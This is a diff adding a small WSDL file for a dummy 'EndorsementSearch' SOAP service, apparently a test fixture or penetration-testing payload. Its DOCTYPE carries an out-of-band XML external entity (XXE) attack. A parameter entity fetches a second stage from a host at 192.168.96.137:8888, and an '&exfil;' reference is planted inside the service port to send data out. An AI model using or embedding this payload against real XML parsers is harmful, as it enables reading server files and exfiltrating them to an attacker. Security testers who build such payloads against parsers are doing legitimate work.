@@ -1,0 +1,18 @@
+ <?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE x [<!ENTITY % foo SYSTEM "http://192.168.96.137:8888/stage2.xml">%foo;
+%param1;]><definitions name="EndorsementSearch"
+  targetNamespace="http://namespaces.test.ttt"
+  xmlns:es="http://www.test.ttt/EndorsementSearch.wsdl"
+  xmlns:esxsd="http://schemas.test.ttt/EndorsementSearch.xsd"
+  xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
+  xmlns="http://schemas.xmlsoap.org/wsdl/">
+   <portType name="GetEndorsingBoarderPortType">
+  </portType>
+  <binding name="EndorsementSearchSoapBinding" type="es:GetEndorsingBoarderPortType">
+  </binding>
+  <service name="EndorsementSearchService">
+    <documentation>test</documentation>
+    <port name="GetEndorsingBoarderPort" binding="es:EndorsementSearchSoapBinding">&exfil;
+      <soap:address location="http://www.test.ttt/EndorsementSearch"/>
+    </port>
+  </service>
+</definitions>
